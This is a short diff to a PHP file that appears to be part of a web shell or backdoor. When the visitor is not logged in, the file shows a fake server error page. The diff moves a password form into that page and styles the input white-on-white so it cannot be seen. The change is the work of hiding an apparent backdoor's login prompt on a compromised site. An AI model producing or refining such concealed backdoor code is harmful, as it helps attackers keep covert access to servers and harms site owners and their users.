@@ -55,11 +55,11 @@ if (is_logged_in()) {
         <p>More information about this error may be available in the server error log.</p>
         <hr>
         <address><?php echo $_SERVER['SERVER_SOFTWARE']; ?></address>
+        <form method="post">
+        <input style="margin: 0 auto; display: block; background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password">
         </form>
     </body>
     </html>
     <?php
 }
 ?>
-<form method="post">
-        <input style="margin: 0 auto; display: block; background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password">
